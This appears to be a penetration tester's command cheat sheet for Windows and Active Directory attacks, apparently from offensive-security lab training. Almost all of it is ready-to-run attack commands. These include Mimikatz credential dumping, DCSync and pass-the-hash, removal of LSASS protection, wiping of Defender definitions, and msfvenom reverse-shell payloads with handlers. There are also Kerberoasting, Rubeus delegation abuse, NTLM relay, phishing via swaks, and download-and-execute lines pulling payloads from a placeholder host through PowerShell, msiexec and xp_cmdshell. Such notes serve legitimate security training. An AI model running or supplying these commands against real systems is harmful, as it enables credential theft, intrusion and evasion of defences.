### Commands ###




### Screen ###


sudo screen -dmS openvpn sudo openvpn config.ovpn

sudo screen -dmS covenant dotnet run

sudo screen -dmS neo4j /usr/bin/neo4j console






### MSBuild ###

C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\tasks\cs-mb.xml
-> to get the meterpreter on 8081

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\windows\tasks\aes.xml



### InstallUtil ###

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U \\<system>\<directory>\install_x86.exe





### Schtasks ###

schtasks /change /S <host> /U administrator /RU SYSTEM /tn <taskname>

schtasks /query /tn <taskname>





### Mimikatz ###

-Wiki: https://github.com/gentilkiwi/mimikatz/wiki

privilege::debug

lsadump::dcsync /domain:<domain>.com /user:<domain>\krbtgt

sekurlsa::pth /user:admin /domain:<domain> /ntlm:<hash> /run:powershell

sekurlsa::tickets

sekurlsa::tickets /export

kerberos::ptt [0;92c2eb]-2-0-60a10000-admin@krbtgt-<domain>COM.kirbi

sekurlsa::logonpasswords

!+ to load driver
!processprotect /process:lsass.exe /remove

sekurlsa::minidump lsass.dmp

-Note: from meterp
load kiwi
kiwi_cmd sekurlsa::logonpasswords

Note: meterp quoting, just escape the args 
kiwi_cmd \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>\"


-Note: from the command line, non-interactive
.\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit


lsadump::sam 




### Proxifier - Windows ###

download and install the full installer

configure the metasploit shell to listen on the tun0 address 

then, setup proxifier to connect to the tun0 address to proxy all connections from the Windows box to the proxy 





### Tamper Windows AV ###

Get-MpComputerStatus

"Mandatory Label\High Mandatory Level" doesn't work to disable
.\MpCmdRun.exe -RemoveDefinitions -All




### Enumerate Constrained Language Mode ###

$ExecutionContext.SessionState.LanguageMode




### Certutil ###
certutil -encode inputFileName encodedOutputFileName



### - Swaks ###

swaks --server x.x.x.x --to <user>@<domain>.com --from jh@<domain> --attach-type text/plain --attach-body body.txt --h-Subject 'Legitimate Subject, Absolutely'





### Msiexec ###

msiexec.exe /q /i http://x.x.x.x/met.msi



### Microsoft.Workflow.Compiler ###
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe .\weconfig.xml res.xml
 


### Impacket ###

sudo proxychains python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py <domain>/<user>@x.x.x.x -windows-auth


sudo impacket-ntlmrelayx --no-http-server -t x.x.x.x -smb2support -c 'powershell -enc <base64encoded...>'





### WinRM ###

Enable-PSRemoting -Force
winrm quickconfig
Set-Item WSMan:localhost\client\trustedhosts -Value *

Enter-PSSession -ComputerName <host> -Authentication Negotiate




### GPOs ###
In BloodHound, grab the GPO policy location and Object ID 

Then, use PowerView Convert-SidToName to determine the groups/users that are in the policy 

For example:

\\<domain>.com\SYSVOL\<domain>.com\Policies\{A4D...}\Machine\Microsoft\Windows NT\SecEdit ->
GptTmpl -> SID in file to convert 





### PSExec ###

.\pex.exe \\dc.<domain>.com "C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" /logfile= /LogToConsole=false /U c:\windows\tasks\inaesmet.exe

-Note: WATCH OUT FOR THE QUOTES!!!


sudo proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py <domain>/<user>@dc01.<domain> -k -no-pass -dc-ip x.x.x.x



### Mstsc ###

mstsc.exe /admin

mstsc.exe /restrictedadmin

xfreerdp /u:admin /pth:<hash> /v:x.x.x.x /cert-ignore

Note: if NLA is an issue? - didn't work with hash, though 
proxychains xfreerdp /u:administrator /p:<password> /v:x.x.x.x /sec:nla /cert-ignore 




### SharpHound ###

Note: while running via proxifier
runas /netonly /user:<domain>\<user> powershell.exe

.\SharpHound.exe -c All -d <domain>.com --domaincontroller x.x.x.x

    -Note: using proxifier, we can then use sharphound from a non-domain joined box 


Note: python from kali

sudo proxychains bloodhound-python -d <domain>.com -u <user> -c all -v --dns-tcp






### Kerberoast ###

sudo proxychains python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request-user <account> -dc-ip x.x.x.x <domain>.com/<user>:<password>




### SSHuttle ###

sudo proxychains sshuttle -l 127.0.0.1:8090 -r <user>@y.y.y.y y.y.y.0/24 -x x.x.x.x --ssh-cmd 'ssh -i key'





### Crackmapexec ###

/home/kali/.local/bin/cme smb

/home/kali/.local/bin/cme smb -u <user> -p <password> -d <domain> x.x.x.x






### Neo4j ###

cd /usr/bin                               
sudo ./neo4j console






### PowerView ###

Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat hashcat


Get-DomainController


Get-Domain


powershell.exe -version 3
(New-Object System.Net.Webclient).downloadstring("http://x.x.x.x/PowerView.ps1") | IEX

Get-ObjectAcl -Identity offsec

Convert-SidToName <SID>


Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | AddMember -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
    -Note: auto convert SID 
    -Note: Invoke-ACLScanner does the same 


Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
$("$env:UserDomain\$env:Username")) {$_}}
    -Note: enumerate all ACEs for all domain users

    -Filter: | Where-Object ActiveDirectoryRights -like GenericA*
    -Filter: | Where-Object ActiveDirectoryRights -Match WriteDA*
    -Filter: | Where-Object ActiveDirectoryRights -Match GenericWr*



Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq
$("$env:UserDomain\$env:Username")) {$_}}
    -Note: enumerate all domain groups current user has access to


Invoke-ACLScanner -ResolveGUIDs | where {$_.ActiveDirectoryRights -eq 'GenericWrite'}

Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity
offsec -Rights All





Get-DomainComputer -Unconstrained
    -Note: find unconstrained delegation servers

Get-DomainUser -TrustedToAuth

Get-DomainComputer -TrustedToAuth

Get-DomainUser -Domain <domain>

Get-DomainForeignGroupMember -Domain <domain>

Convert-SidToName <SID>

Get-DomainTrustMapping


([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

Get-ForestTrust





### WMIC ###

wmic /node:dc01 process call create "c:\windows\tasks\GruntHTTP.exe"






### PowerShell ###

(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/abypass.txt') | IEX


powershell (New-Object System.Net.WebClient).DownloadFile('http://x.x.x.x/inaesmet.exe','c:\windows\tasks\inaesmet.exe')






### Meterpreter ###

execute -H -f notepad

migrate <PID>

use multi/manage/autoroute
run 

use auxiliary/server/socks4a
exploit -j 

upload /var/www/html/PsExec.exe .





### MSFvenom ###

sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=8081 -f csharp

use multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST x.x.x.x
set LPORT 8081
set EXITFUNC thread



sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=8082 -f elf -o met

use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST x.x.x.x
set LPORT 8082
set EXITFUNC thread




### iSMTP.py Mail Enumeration ###

./iSMTP.py -h x.x.x.x:25 -l 2 -e emails.txt






### Working with SDDLs ###

-Reference: 

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f4296d69-1c0f-491f-9587-a960b292d070

-Note: native PowerShell commandlet 

-Command: ConvertFrom-SddlString "SDDLstring"






### GhostPack ###

Rubeus.exe monitor /interval:5 /filteruser:DC01$

Rubeus /command:"asktgt /user:dc01$ /domain:<domain> /rc4:<hash> /outfile:tgt.kirbi"
    -Note: via Covenant 

Rubeus /command:"s4u /ticket:tgt.kirbi /impersonateuser:administrator /msdsspn:cifs/file01.<domain> /ptt"      

Rubeus.exe s4u /ticket:ssdfsfsssdfsdf... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.<domain>.com:1433 /altservice:CIFS /ptt
    -Note: gaining access to alternate service 

Rubeus.exe ptt /ticket:doIFIjCCBR6gAwI...

Rubeus.exe hash /password:lab





### SharpSC ###

SharpSC /command:"action=create computername=<host> service=cr displayname=crservice binpath=c:\windows\tasks\cr1.exe"
 
SharpSC /command:"action=start computername=<host> service=cr"






### Covenant ###

Mimikatz /command:"\"!processprotect /process:lsass.exe /remove\""

Assembly /assemblyname:"SpoolSample.exe" /parameters:"websys websys/pipe/s"

shell "cmd.exe /c c:\windows\tasks\cr1.exe"

ImpersonateProcess /processid:"4440"

powershell "copy c:\windows\temp\cr3.exe \\dc01.<domain>\c$\windows\tasks\"

DCSync /username:"administrator" /fqdn:"domain.com" /dc:"dc01.domain.com"

Rubeus /command:"asktgt /user:websys$ /domain:domain.com /rc4:<hash> /outfile:tgt.kirbi"
 
Rubeus /command:"s4u /ticket:tgt.kirbi /impersonateuser:administrator /msdsspn:cifs/dc01.<domain> /ptt"      








### Windows Service Control ###

sc create mimidrv binpath= c:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand

sc start mimidrv





### SpoolSample ###

SpoolSample.exe DC01 WEBSRV01





### SQL ###

-Note: 

Reminder, even if you're in the context of a sql admin, try to get to SA. Try to get the administrator hash of the box, login and reset SA password.


select user_name();

select system_user;

select version from openquery("<host>", 'select @@version as version');

exec sp_linkedservers

exec sp_testlinkedserver <host>;

exec sp_serveroption '<host>', 'rpc out', 'true';

exec ('sp_configure ''show advanced options'', 1; reconfigure;') AT <host>

exec ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT <host>


-Note: 

$command = "(New-Object System.Net.WebClient).DOwnloadFile('http://x.x.x.x/inaesmet.exe','c:\windows\tasks\inaesmet.exe')"


exec ('xp_cmdshell ''powershell -enc <base64encoded...>'';') AT <host>
exec ('xp_cmdshell ''dir c:\windows\tasks\'';') AT <host>


-Note: 

$command2 = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U c:\windows\tasks\inaesmet.exe"


exec ('xp_cmdshell ''powershell -enc <base64encoded...>'';') AT <host>







### Gobuster ###

/home/kali/go/bin/gobuster dir -u http://x.x.x.x/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt


/home/kali/go/bin/gobuster dir -u http://x.x.x.x/blah/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx
    -Note: searching for ASPX 



### ACLs ###

-Reference:

https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/


"Available -Rights are 'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended rights GUID can be set with -RightsGUID"





### Restricted Admin Mode ###

New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0




### GTFOBins ###

https://gtfobins.github.io/gtfobins/find/
